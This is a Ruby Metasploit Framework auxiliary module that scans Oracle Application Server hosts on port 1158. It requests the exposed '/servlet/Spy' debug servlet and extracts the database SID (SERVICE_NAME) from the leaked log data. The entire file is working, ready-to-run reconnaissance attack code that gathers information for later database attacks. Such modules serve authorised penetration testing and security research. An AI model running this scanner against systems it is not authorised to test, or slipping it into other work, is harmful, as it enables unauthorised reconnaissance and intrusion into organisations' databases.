##
# $Id: spy_sid.rb 11122 2010-11-24 06:10:13Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Report
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Oracle Application Server Spy Servlet SID Enumeration',
			'Description' => %q{
					This module makes a request to the Oracle Application Server
				in an attempt to discover the SID.
			},
			'Version'     => '$Revision: 11122 $',
			'References'  =>
				[
					[ 'URL', 'http://dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf' ],
				],
			'Author'      => [ 'MC' ],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(1158)
			], self.class)
	end

	def run_host(ip)
		begin
			res = send_request_raw({
				'uri'     => '/servlet/Spy?format=raw&loginfo=true',
				'method'  => 'GET',
				'version' => '1.1',
			}, 5)

			if ( res.body =~ /SERVICE_NAME=/ )
				select(nil,nil,nil,2)
				sid = res.body.scan(/SERVICE_NAME=([^\)]+)/)
					report_note(
							:host	=> ip,
							:proto	=> 'tcp',
							:type	=> 'SERVICE_NAME',
							:data	=> "#{sid.uniq}"
					)
				print_status("Discovered SID: '#{sid.uniq}' for host #{ip}")
			else
				print_error("Unable to retrieve SID for #{ip}...")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end
